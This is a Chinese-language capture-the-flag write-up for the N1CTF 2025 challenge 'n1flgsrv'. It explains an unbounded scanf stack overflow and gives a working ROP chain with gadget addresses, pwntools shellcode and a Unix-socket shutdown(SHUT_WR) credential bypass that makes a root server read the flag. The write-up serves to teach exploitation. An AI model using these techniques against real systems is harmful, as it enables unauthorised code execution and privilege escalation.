# N1CTF 2025 n1flgsrv

## 题目简述

附件的最小 rootfs 中有两个静态链接的 x86-64 程序。`srv` 以 root 身份运行在 `/srv` chroot 中，保存于 `/srv/flag` 的 flag 权限为 `0400`；`cli` 则通过自定义 `chrooot` 以 UID/GID 1337 运行在另一个 chroot 中。两者通过 Unix 域套接字通信，`cli` 已连接的套接字位于文件描述符 3。

`srv` 开启 `SO_PASSCRED`，用 `SCM_CREDENTIALS` 识别请求者 UID，只在目标文件所有者与该 UID 一致时返回内容。题目要求同时利用 `cli` 的栈溢出和题目内核中 Unix socket 在半关闭后的空凭证行为，让 root 服务代读 `/flag`。

## 解题过程

两个二进制均为无 PIE、NX 开启、无 canary 的静态程序。`cli` 读取一行命令时使用了没有宽度限制的格式串：

```c
scanf("%[^\n]%1[\n]", stack_buffer);
```

从缓冲区起点到保存返回地址的偏移为 `0x138`，因此可以直接构造 ROP。由于 NX 开启，先调用固定地址处的 `mprotect` 把 `0x400000` 起始的两页改为可读、可写、可执行，再调用 `read` 把第二阶段 shellcode 写入该地址，最后跳转过去：

```python
MPROTECT = 0x53c0d0
READ = 0x53b480

def call3(a1, a2, a3, func):
    return flat(
        0x407630, a1,   # pop rdi ; ret
        0x44ccfe, a2,   # pop rsi ; ret
        0x4bdf0c, a3,   # pop rdx ; ret
        func,
    )

payload = b'A' * 0x138
payload += call3(0x400000, 0x2000, 7, MPROTECT)
payload += call3(0, 0x400000, len(shellcode), READ)
payload += p64(0x400000)
```

仅取得代码执行还不够：shellcode 仍以 UID 1337 运行，自己无法读取 root 所有的 flag。必须继续使用已经连到特权 `srv` 的 fd 3。

正常情况下，`srv` 的 `recvmsg` 会取得内核附带的 `(pid, uid=1337, gid=1337)`，所以直接发送 `/flag` 会被所有者检查拒绝。题目内核的关键行为发生在

```c
shutdown(fd, SHUT_WR)
```

之后：Unix socket 的 peer credential 指针被清空；服务端随后用 `recvmsg` 读到 EOF 时，凭证回退到 `init_cred`，表现为 PID/UID/GID 均为 0。服务端把本次连接记录的 UID 更新为 0，于是 `/flag` 的所有者检查通过。这里必须使用 `SHUT_WR` 而不是 `close`：前者只关闭写方向，仍允许客户端从 fd 3 读取服务端响应。

第二阶段 shellcode按如下顺序工作：

1. 从标准输入读取 256 字节文件名。
2. 把这 256 字节写入 fd 3。
3. 对 fd 3 执行 `shutdown(SHUT_WR)`，让服务端在 EOF 路径上取得 UID 0。
4. 从 fd 3 读取服务器返回的文件内容。
5. 把结果写到标准输出。

官方脚本用 pwntools 生成该逻辑：

```python
context.arch = 'amd64'
shellcode = asm(
    'lea rbp, [rsp-512]\n' +
    shellcraft.read(0, 'rbp', 256) +
    shellcraft.write(3, 'rbp', 256) +
    'mov rsi, 1\n' +                 # SHUT_WR
    shellcraft.shutdown(3) +
    shellcraft.read(3, 'rbp', 256) +
    shellcraft.write(1, 'rbp', 256)
)
```

发送第一阶段 ROP 和第二阶段 shellcode 后，再发送恰好 256 字节的路径：

```python
io.sendline(tty_escape(payload))
io.send(tty_escape(shellcode))
io.send(b'/flag'.rjust(256, b'/'))
```

前导的多个 `/` 不改变绝对路径含义，同时满足 shellcode 固定读取 256 字节的要求。服务端完成代读后，flag 从 fd 3 回到标准输出。

## 方法总结

本题是“内存破坏取得执行流”与“本地协议身份绕过”的组合。栈溢出只提供在 UID 1337 进程内执行 shellcode 的能力，真正越过权限边界的是 fd 3 上的 Unix socket 凭证状态变化。分析此类题目时应同时保留进程身份、chroot 根、继承文件描述符和半关闭语义：`shutdown(SHUT_WR)` 既触发服务端的 EOF/空凭证路径，又保留读取 flag 的通道。
